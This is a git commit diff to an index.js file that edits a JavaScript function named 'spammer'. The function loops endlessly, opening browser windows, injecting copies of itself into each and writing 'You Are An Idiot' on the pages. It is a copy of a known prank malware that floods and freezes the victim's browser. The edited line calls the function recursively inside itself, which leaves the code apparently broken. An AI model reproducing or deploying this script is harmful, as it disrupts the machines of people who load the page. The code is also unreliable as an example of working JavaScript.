008a635d71066e85bd525abfe85aa9d18fa8f1b2
JJJ <115508192+jj123llol@users.noreply.github.com>
2024-09-23 15:58:01 -0500

    Update index.js

--- index.js
+++ index.js
@@ -2,7 +2,7 @@ function spammer(){
   while(true){
   wind = window.open()
   script = wind.document.createElement('script')
-  script.innerHTML = 'wind.onload = ' + spammer.toString() + ';';
+  script.innerHTML = spammer().toString()
   wind.document.body.appendChild(script)
   idiot = wind.document.createTextNode("You Are An Idiot")
   wind.document.body.appendChild(idiot)
